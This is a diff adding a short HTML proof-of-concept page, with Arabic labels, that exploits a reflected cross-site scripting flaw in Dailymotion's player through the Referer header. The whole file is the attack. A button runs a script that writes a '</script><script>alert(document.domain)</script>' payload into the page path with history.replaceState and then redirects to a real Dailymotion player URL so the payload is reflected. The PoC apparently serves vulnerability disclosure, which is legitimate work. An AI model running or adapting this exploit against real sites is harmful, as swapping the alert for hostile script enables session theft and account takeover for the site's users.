@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PoC Dailymotion XSS via Referer</title>
+</head>
+<body>
+  <h2>PoC: Dailymotion XSS via Referer</h2>
+  <p>اضغط الزر لتنفيذ XSS</p>
+  <button onclick="launchAttack()">ابدأ الهجوم</button>
+
+  <script>
+    function launchAttack() {
+      // تعديل العنوان الحالي بإضافة الحمولة في المسار
+      history.replaceState(null, "", "/ao5g1</script><script>alert(document.domain)</script>c44j6");
+
+      // فتح صفحة الهدف في نفس النافذة
+      window.location.href = "https://geo.dailymotion.com/player/x138o4.html";
+    }
+  </script>
+</body>
+</html>
